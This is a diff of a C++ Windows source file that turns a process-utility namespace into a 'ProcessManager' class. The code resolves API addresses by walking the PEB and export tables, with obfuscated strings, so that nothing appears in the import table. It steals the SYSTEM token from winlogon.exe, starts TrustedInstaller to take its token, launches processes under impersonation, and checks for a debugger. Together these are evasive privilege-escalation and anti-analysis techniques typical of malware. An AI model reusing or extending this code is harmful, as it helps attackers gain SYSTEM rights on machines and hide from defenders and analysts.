@@ -1,11 +1,6 @@
-#include "procutils.h"
+#include "procmgr.h"
 
-static std::unordered_map<std::string, HMODULE> _loadedLibs;
-
-// frequently used function pointers
-ProcessUtilities::PPROCFN::_FreeLibrary _FreeLibrary = nullptr;
-
-static std::string ProcessUtilities::_lower(std::string inp) {
+std::string _lower(std::string inp) {
 	std::string out = "";
 	for ( auto& c : inp )
 		out += tolower(c);
@@ -14,15 +9,15 @@ static std::string ProcessUtilities::_lower(std::string inp) {
 
 // return true if they are equal
 // return false if otherwise
-static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {
+BOOL _sub(std::string libPath, std::string s2) {
 	return libPath.find(s2) != std::string::npos;
 }
 
-std::string ProcessUtilities::PWSTRToString(PWSTR inp) {
+std::string PWSTRToString(PWSTR inp) {
 	return std::string(_bstr_t(inp));
 }
 
-FARPROC ProcessUtilities::_GetFuncAddress(HMODULE lib, std::string procedure) {
+FARPROC ProcessManager::GetFunctionAddressInternal(HMODULE lib, std::string procedure) {
 	// get nt and dos headers
 	PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
 	PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );
@@ -47,10 +42,10 @@ FARPROC ProcessUtilities::_GetFuncAddress(HMODULE lib, std::string procedure) {
 	return NULL;
 }
 
-HMODULE ProcessUtilities::GetModHandle(std::string libName)
+HMODULE ProcessManager::GetLoadedModule(std::string libName)
 {
-	if ( _loadedLibs.count(_lower(libName).c_str()) > 0 )
-		return _loadedLibs.find(_lower(libName).c_str())->second;
+	if ( this->LoadedDLLs.count(_lower(libName).c_str()) > 0 )
+		return this->LoadedDLLs.find(_lower(libName).c_str())->second;
 
 	PPEB peb = ( PPEB ) GetPebAddress();
 
@@ -65,7 +60,7 @@ HMODULE ProcessUtilities::GetModHandle(std::string libName)
 
 		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
 			HMODULE mod = ( HMODULE ) modInfo->DllBase;
-			_loadedLibs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));
+			this->LoadedDLLs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));
 
 			return mod;
 		}
@@ -74,65 +69,89 @@ HMODULE ProcessUtilities::GetModHandle(std::string libName)
 	return NULL;
 }
 
-HMODULE ProcessUtilities::GetLoadedLib(std::string libName) {
-	if ( _loadedLibs.count(_lower(libName)) > 0 ) {
-		return _loadedLibs.at(_lower(libName));
+HMODULE ProcessManager::GetLoadedLib(std::string libName) {
+	if ( this->LoadedDLLs.count(_lower(libName)) > 0 ) {
+		return this->LoadedDLLs.at(_lower(libName));
 	}
 
-	return GetModHandle(libName);
+	return GetLoadedModule(libName);
 }
 
-BOOL ProcessUtilities::FreeUsedLibrary(std::string lib) {
-	if ( _loadedLibs.find(_lower(lib).c_str()) == _loadedLibs.end() )
+BOOL ProcessManager::FreeUsedLibrary(std::string lib) {
+	if ( this->LoadedDLLs.find(_lower(lib).c_str()) == this->LoadedDLLs.end() )
 		return FALSE;
 
-	HMODULE module = _loadedLibs.find(_lower(lib).c_str())->second;
+	HMODULE module = this->LoadedDLLs.find(_lower(lib).c_str())->second;
 
-	if ( !_FreeLibrary(module) )
+	if ( !Call<_FreeDLL>(GetLoadedLib((char*)HIDE("kernel32.dll")), std::string(HIDE("FreeLibraryA")), module) )
 		return FALSE;
 
-	_loadedLibs.erase(_lower(lib).c_str());
+	this->LoadedDLLs.erase(_lower(lib).c_str());
 
 	return TRUE;
 }
 
-BOOL ProcessUtilities::Init() {
+ProcessManager::ProcessManager() {
 	// load required mods
-	HMODULE kerneldll = GetModHandle(freqDLLS::kernel32);
-	HMODULE advapi = GetModHandle(freqDLLS::advapi32);
-	HMODULE ntdll = GetModHandle(freqDLLS::ntdll);
+	if ( DllsLoaded )
+		return;
 
-	if ( kerneldll == NULL || advapi == NULL || ntdll == NULL )
-		return FALSE;
+	Kernel32DLL = this->GetLoadedModule((char*)HIDE("kernel32.dll"));
+	AdvApi32DLL = this->GetLoadedModule((char*)HIDE("advapi32.dll"));
+	NTDLL       = this->GetLoadedModule((char*)HIDE("ntdll.dll"));
 
-	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));
-	_SetThreadToken = GetFunctionAddress<PPROCFN::_SetThreadToken>(advapi, std::string(HIDE("SetThreadToken")));
+	if ( Kernel32DLL == NULL || AdvApi32DLL == NULL || NTDLL == NULL )
+		return;
 
-	return TRUE;
+	this->DynamicLoadNativeFunctions();
 }
 
-BOOL ProcessUtilities::Clean() {
-	BOOL success = FALSE;
-	for ( auto& libInfo : _loadedLibs )
-	{
-		if ( strcmp(_lower(libInfo.first).c_str(), freqDLLS::kernel32.c_str()) != 0 )
-			success = FreeUsedLibrary(libInfo.first.c_str());
-	}
+template <typename type>
+void ProcessManager::LoadNative(char* name, HMODULE from) {
+	type loaded = GetFunctionAddress<type>(from, name);
+	if ( !loaded )
+		return;
 
-	return success;
+	FunctionPointer<type> fp = {};
+	fp.from = from; 
+	fp.call = loaded;
+	fp.name = name;
+
+	this->Natives[name] = std::any(fp);
 }
 
-DWORD ProcessUtilities::PIDFromName(const char* name) {
+void ProcessManager::DynamicLoadNativeFunctions() {
+	if ( this->NativesLoaded )
+		return;
+
+	LoadNative<::_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser"), AdvApi32DLL);
+	LoadNative<::_CreateToolhelp32Snapshot>((char*)HIDE("CreateToolhelp32Snapshot"), Kernel32DLL);
+	LoadNative<::_OpenServiceA>((char*)HIDE("OpenServiceA"), AdvApi32DLL);
+	LoadNative<::_OpenSCManagerW>((char*)HIDE("OpenSCManagerW"), AdvApi32DLL);
+	LoadNative<::_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx"), AdvApi32DLL);
+	LoadNative<::_StartService>((char*)HIDE("StartServiceW"), AdvApi32DLL);
+	LoadNative<::_CreateProcessWithTokenW>((char*)HIDE("CreateProcessWithTokenW"), AdvApi32DLL);
+	LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
+	LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
+	LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
+	LoadNative<::_GetComputerNameA>((char*)HIDE("GetComputerNameA"), Kernel32DLL);
+	this->NativesLoaded = TRUE;
+}
+
+ProcessManager::~ProcessManager() {
+	for ( auto& libInfo : this->LoadedDLLs )
+		if ( strcmp(_lower(libInfo.first).c_str(), (char*)HIDE("kernel32.dll")) != 0)
+			FreeUsedLibrary(libInfo.first.c_str());
+}
+
+DWORD ProcessManager::PIDFromName(const char* name) {
 	// take snapshot of all current running processes
-
-	HMODULE kernel32 = GetLoadedLib(freqDLLS::kernel32);
-	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));
-	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));
-	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));
 
 	PROCESSENTRY32 processEntry;
 	DWORD          processID = -1;
-	HANDLE         processSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	HANDLE         processSnapshot = GetNative<::_CreateToolhelp32Snapshot>((char*) HIDE("CreateToolhelp32Snapshot")).call(TH32CS_SNAPPROCESS, 0);
+
+	OutputDebugStringA("process");
 
 	if ( processSnapshot == INVALID_HANDLE_VALUE ) {
 		return -1;
@@ -141,7 +160,7 @@ DWORD ProcessUtilities::PIDFromName(const char* name) {
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
 
 	// process the first file in the snapshot, put information in processEntry
-	if ( !_Process32FirstW(processSnapshot, &processEntry) ) {
+	if ( !GetNative<_Process32FirstW>((char*)HIDE("Process32FirstW")).call( processSnapshot, &processEntry ) ) {
 		SysNtClose(processSnapshot);
 		return -1;
 	}
@@ -154,14 +173,14 @@ DWORD ProcessUtilities::PIDFromName(const char* name) {
 			processID = processEntry.th32ProcessID;
 			break;
 		}
-	} while ( _Process32NextW(processSnapshot, &processEntry) ); // iterate if the next process in the snapshot is valid
+	} while ( GetNative<_Process32NextW>((char*)HIDE("Process32NextW")).call( processSnapshot, &processEntry ) ); // iterate if the next process in the snapshot is valid
 
 	SysNtClose(processSnapshot);
 
 	return processID;
 }
 
-HANDLE ProcessUtilities::CreateProcessAccessToken(DWORD processID) {
+HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
 	OBJECT_ATTRIBUTES objectAttributes{};
 	HANDLE            process = NULL;
 	CLIENT_ID         pInfo{};
@@ -212,11 +231,7 @@ HANDLE ProcessUtilities::CreateProcessAccessToken(DWORD processID) {
 	return duplicatedToken;
 }
 
-void ProcessUtilities::HaltProcessExecution() {
-	system(HIDE("ping 127.0.0.1 -n 5693 > null "));
-}
-
-BOOL ProcessUtilities::OpenProcessAsImposter(
+BOOL ProcessManager::OpenProcessAsImposter(
 	HANDLE token,
 	DWORD dwLogonFlags,
 	LPCWSTR lpApplicationName,
@@ -227,8 +242,8 @@ BOOL ProcessUtilities::OpenProcessAsImposter(
 	LPSTARTUPINFOW lpStartupInfo,
 	LPPROCESS_INFORMATION lpProcessInformation
 ) {
-	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));
-	return pCreateProcessWithTokenW(
+
+	return GetNative<_CreateProcessWithTokenW>((char*) HIDE("CreateProcessWithTokenW")).call(
 		token,
 		dwLogonFlags,
 		lpApplicationName,
@@ -241,19 +256,12 @@ BOOL ProcessUtilities::OpenProcessAsImposter(
 	);
 }
 
-DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
-
-	HMODULE advapi = GetLoadedLib(freqDLLS::advapi32);
-	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));
-	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));
-	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));
-	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));
-
-	SC_HANDLE scManager = pOpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
+DWORD ProcessManager::StartWindowsService(std::string serviceName) {
+	SC_HANDLE scManager = GetNative<_OpenSCManagerW>((char*)HIDE("OpenSCManagerW")).call( nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE );
 	if ( scManager == NULL )
 		return -1;
 
-	SC_HANDLE service = pOpenServiceA(scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE);
+	SC_HANDLE service = GetNative<_OpenServiceA>((char*)HIDE("OpenServiceA")).call( scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE );
 	if ( service == NULL ) {
 		SysNtClose(scManager);
 		return -1;
@@ -265,7 +273,7 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 	// query and attempt to start, wait if stop pending, until service running
 	do {
 		// query the service status
-		if ( !pQueryServiceStatus(
+		if ( !GetNative<_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx")).call(
 			service,
 			SC_STATUS_PROCESS_INFO,
 			( LPBYTE ) &status,
@@ -291,9 +299,10 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 			Sleep(wait);
 			continue;
 		}
+
 		// service is not running
 		if ( status.dwCurrentState == SERVICE_STOPPED ) {
-			BOOL serviceStarted = pStartService(service, 0, NULL);
+			BOOL serviceStarted = GetNative<_StartService>((char*)HIDE("StartServiceW")).call( service, 0, NULL );
 			if ( !serviceStarted ) {
 				SysNtClose(service);
 				SysNtClose(scManager);
@@ -309,11 +318,8 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 	return status.dwProcessId;
 }
 
-HANDLE ProcessUtilities::ImpersonateWithToken(HANDLE token) {
-	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);
-	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));
-
-	if ( !_ImpersonateLoggedOnUser(token) ) {
+HANDLE ProcessManager::ImpersonateWithToken(HANDLE token) {
+	if ( !GetNative<_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser")).call( token ) ) {
 		SysNtClose(token);
 		return NULL;
 	}
@@ -321,7 +327,7 @@ HANDLE ProcessUtilities::ImpersonateWithToken(HANDLE token) {
 	return token;
 }
 
-HANDLE ProcessUtilities::GetSystemToken() {
+HANDLE ProcessManager::GetSystemToken() {
 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
 	if ( logonPID == 0 ) // bad process id
 		return FALSE;
@@ -334,9 +340,9 @@ HANDLE ProcessUtilities::GetSystemToken() {
 	return ImpersonateWithToken(winlogon);
 }
 
-HANDLE ProcessUtilities::GetTrustedInstallerToken() {
-	DWORD  pid   = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));
-	HANDLE token = ProcessUtilities::CreateProcessAccessToken(pid);
+HANDLE ProcessManager::GetTrustedInstallerToken() {
+	DWORD  pid   = StartWindowsService(std::string(HIDE("TrustedInstaller")));
+	HANDLE token = CreateProcessAccessToken(pid);
 	if ( token == NULL )
 		return NULL;
 
@@ -344,12 +350,11 @@ HANDLE ProcessUtilities::GetTrustedInstallerToken() {
 }
 
 
-BOOL ProcessUtilities::CheckNoDebugger() {
+BOOL ProcessManager::CheckNoDebugger() {
 	PPEB filePEB = ( PPEB ) GetPebAddress();
 	BYTE beingDebugged = filePEB->BeingDebugged;
 
 	if ( beingDebugged ) {
-		HaltProcessExecution();
 		return TRUE;
 	}
 
